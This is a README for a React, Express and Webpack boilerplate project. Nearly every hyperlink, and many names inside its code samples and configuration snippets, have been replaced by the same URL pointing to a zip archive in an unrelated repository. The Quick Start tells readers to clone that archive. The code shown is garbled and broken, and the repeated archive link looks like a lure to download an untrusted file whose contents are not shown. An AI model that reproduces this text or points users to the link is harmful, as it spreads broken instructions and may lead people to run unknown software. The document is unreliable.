# simple-react-full-stack

[![Build Status](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip)](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip)
[![Greenkeeper badge](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip)](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip)

This is a boilerplate to build a full stack web application using React, https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip, Express and Webpack. It is also configured with webpack-dev-server, eslint, prettier and babel.

- [simple-react-full-stack](#simple-react-full-stack)
  - [Introduction](#introduction)
    - [Development mode](#development-mode)
    - [Production mode](#production-mode)
  - [Quick Start](#quick-start)
  - [Documentation](#documentation)
    - [Folder Structure](#folder-structure)
    - [Babel](#babel)
    - [ESLint](#eslint)
    - [Webpack](#webpack)
    - [Webpack dev server](#webpack-dev-server)
    - [Nodemon](#nodemon)
    - [Express](#express)
    - [Concurrently](#concurrently)
    - [VSCode + ESLint + Prettier](#vscode--eslint--prettier)
      - [Installation guide](#installation-guide)

## Introduction

[Create React App](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip) is a quick way to get started with React development and it requires no build configuration. But it completely hides the build config which makes it difficult to extend. It also requires some additional work to integrate it with an existing https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip backend application.

This is a simple full stack [React](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip) application with a [https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip) and [Express](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip) backend. Client side code is written in React and the backend API is written using Express. This application is configured with [Standardjs ESLint rules](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip) and formatted through [prettier](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip).

### Development mode

In the development mode, we will have 2 servers running. The front end code will be served by the [webpack dev server](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip) which helps with hot and live reloading. The server side Express code will be served by a node server using [nodemon](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip) which helps in automatically restarting the server whenever server side code changes.

### Production mode

In the production mode, we will have only 1 server running. All the client side code will be bundled into static files using webpack and it will be served by the https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip application.

## Quick Start

```bash
# Clone the repository
git clone https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip

# Go inside the directory
cd exercise

# Install dependencies
yarn (or npm install)

# Start development server
yarn dev (or npm run dev)

# Build for production
yarn build (or npm run build)

# Start production server
yarn start (or npm start)
```

## Documentation

### Folder Structure

All the source code will be inside **src** directory. Inside src, there is client and server directory. All the frontend code (react, css, js and any other assets) will be in client directory. Backend https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip code will be in the server directory.

### Babel

[Babel](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip) helps us to write code in the latest version of JavaScript. If an environment does not support certain features natively, Babel will help us to compile those features down to a supported version. It also helps us to convert JSX to Javascript.

[.babelrc file](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip) is used describe the configurations required for Babel. Below is the .babelrc file which I am using.

```javascript
{
    "presets": ["env", "react"]
}
```

Babel requires plugins to do the transformation. Presets are the set of plugins defined by Babel. Preset **env** allows to use babel-preset-es2015, babel-preset-es2016, and babel-preset-es2017 and it will transform them to ES5. Preset **react** allows us to use JSX syntax and it will transform JSX to Javascript.

### ESLint

[ESLint](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip) is a pluggable and configurable linter tool for identifying and reporting on patterns in JavaScript.

[https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip file](<(https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip)>) (alternatively configurations can we written in Javascript or YAML as well) is used describe the configurations required for ESLint. Below is the https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip file which I am using.

```javascript
{
  "extends": ["standard", "standard-react"],
  "env": {
    "browser": true,
    "node": true
  },
  "rules": {
  }
}
```

[I am using Standardjs Javascript Style Guide](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip). Since we are going to write both client (browser) and server side (https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip) code, I am setting the **env** to browser and node. Optionally, we can override the Standardjs configurations to suit our needs.

### Webpack

[Webpack](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip) is a module bundler. Its main purpose is to bundle JavaScript files for usage in a browser.

[https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip) file is used to describe the configurations required for webpack. Below is the https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip file which I am using.

```javascript
const path = require("path");
const HtmlWebpackPlugin = require("html-webpack-plugin");
const CleanWebpackPlugin = require("clean-webpack-plugin");

const outputDirectory = "dist";

https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip = {
  entry: ["babel-polyfill", "https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip"],
  output: {
    path: https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip(__dirname, outputDirectory),
    filename: "https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip"
  },
  module: {
    rules: [
      {
        test: /\.js$/,
        exclude: /node_modules/,
        use: {
          loader: "babel-loader"
        }
      },
      {
        test: /\.css$/,
        use: ["style-loader", "css-loader"]
      },
      {
        test: /\.(png|woff|woff2|eot|ttf|svg)$/,
        loader: "url-loader?limit=100000"
      }
    ]
  },
  devServer: {
    port: 3000,
    open: true,
    proxy: {
      "/api": "http://localhost:8080"
    }
  },
  plugins: [
    new CleanWebpackPlugin([outputDirectory]),
    new HtmlWebpackPlugin({
      template: "https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip",
      favicon: "https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip"
    })
  ]
};
```

1.  **entry:** entry: https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip is where the application starts executing and webpack starts bundling.
    Note: babel-polyfill is added to support async/await. Read more [here](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip).
2.  **output path and filename:** the target directory and the filename for the bundled output
3.  **module loaders:** Module loaders are transformations that are applied on the source code of a module. We pass all the js file through [babel-loader](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip) to transform JSX to Javascript. CSS files are passed through [css-loaders](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip) and [style-loaders](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip) to load and bundle CSS files. Fonts and images are loaded through url-loader.
4.  **Dev Server:** Configurations for the webpack-dev-server which will be described in coming section.
5.  **plugins:** [clean-webpack-plugin](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip) is a webpack plugin to remove the build folder(s) before building. [html-webpack-plugin](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip) simplifies creation of HTML files to serve your webpack bundles. It loads the template (https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip) and injects the output bundle.

### Webpack dev server

[Webpack dev server](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip) is used along with webpack. It provides a development server that provides live reloading for the client side code. This should be used for development only.

The devServer section of https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip contains the configuration required to run webpack-dev-server which is given below.

```javascript
devServer: {
    port: 3000,
    open: true,
    proxy: {
        "/api": "http://localhost:8080"
    }
}
```

[**Port**](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip) specifies the Webpack dev server to listen on this particular port (3000 in this case). When [**open**](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip) is set to true, it will automatically open the home page on startup. [Proxying](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip) URLs can be useful when we have a separate API backend development server and we want to send API requests on the same domain. In our case, we have a https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip backend where we want to send the API requests to.

### Nodemon

Nodemon is a utility that will monitor for any changes in the server source code and it automatically restart the server. This is used in development only.

https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip file is used to describe the configurations for Nodemon. Below is the https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip file which I am using.

```javascript
{
  "watch": ["src/server/"]
}
```

Here, we tell nodemon to watch the files in the directory src/server where out server side code resides. Nodemon will restart the node server whenever a file under src/server directory is modified.

### Express

Express is a web application framework for https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip It is used to build our backend API's.

https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip is the entry point to the server application. Below is the https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip file

```javascript
const express = require("express");
const os = require("os");

const app = express();

https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip(https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip("dist"));
https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip("/api/getUsername", (req, res) =>
  https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip({ username: https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip().username })
);
https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip(8080, () => https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip("Listening on port 8080!"));
```

This starts a server and listens on port 8080 for connections. The app responds with `{username: <username>}` for requests to the URL (/api/getUsername). It is also configured to serve the static files from **dist** directory.

### Concurrently

[Concurrently](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip) is used to run multiple commands concurrently. I am using it to run the webpack dev server and the backend node server concurrently in the development environment. Below are the npm/yarn script commands used.

```javascript
"client": "webpack-dev-server --mode development --devtool inline-source-map --hot",
"server": "nodemon https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip",
"dev": "concurrently \"npm run server\" \"npm run client\""
```

### VSCode + ESLint + Prettier

[VSCode](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip) is a lightweight but powerful source code editor. [ESLint](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip) takes care of the code-quality. [Prettier](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip) takes care of all the formatting.

#### Installation guide

1.  Install [VSCode](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip)
2.  Install [ESLint extension](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip)
3.  Install [Prettier extension](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip)
4.  Modify the VSCode user settings to add below configuration

    ```javascript
    "https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip": true,
    "https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip": true,
    "https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip": true,
    "https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip": true
    ```

Above, we have modified editor configurations. Alternatively, this can be configured at the project level by following [this article](https://raw.githubusercontent.com/agaribovic/Book-Publisher/master/exercise_material/Book-Publisher_2.1.zip).
